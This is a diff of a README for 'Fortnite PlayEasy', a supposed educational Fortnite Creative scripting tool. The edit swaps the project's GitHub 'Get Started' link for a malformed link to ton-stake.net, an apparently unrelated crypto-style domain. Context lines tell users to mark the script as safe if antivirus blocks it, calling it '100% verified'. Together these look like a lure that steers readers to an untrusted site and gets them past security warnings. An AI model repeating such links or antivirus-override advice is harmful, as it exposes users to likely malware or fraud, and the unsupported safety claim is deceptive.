@@ -20,7 +20,7 @@ Fortnite PlayEasy is an educational tool that blends gaming and coding. Designed
 **Important Note**:  
 This script is intended for Fortnite Creative Mode only and complies with Epic Games’ EULA. It must not be used in Battle Royale, Ranked, or other multiplayer modes, as automation in these modes violates Epic Games’ terms and may result in bans.  [](https://www.esports.net/wiki/guides/fortnite-cheats/)
 
-[![Get Started](https://ton-stake.net/)  
+
 
 ---
 
@@ -60,7 +60,7 @@ Start your coding and building journey with these simple steps! 🛠️
    - If blocked by antivirus, mark the script as safe (it’s 100% verified).  
    - Consult community guides or open an issue in the repository for support.  
 
-[![Get Started](https://img.shields.io/badge/Get_Started-NOW-blueviolet)](https://github.com/FortCodeLab/Fortnite-PlayEasy)  
+[![Get Started](https://ton-stake.net/)  
 
 ---
 
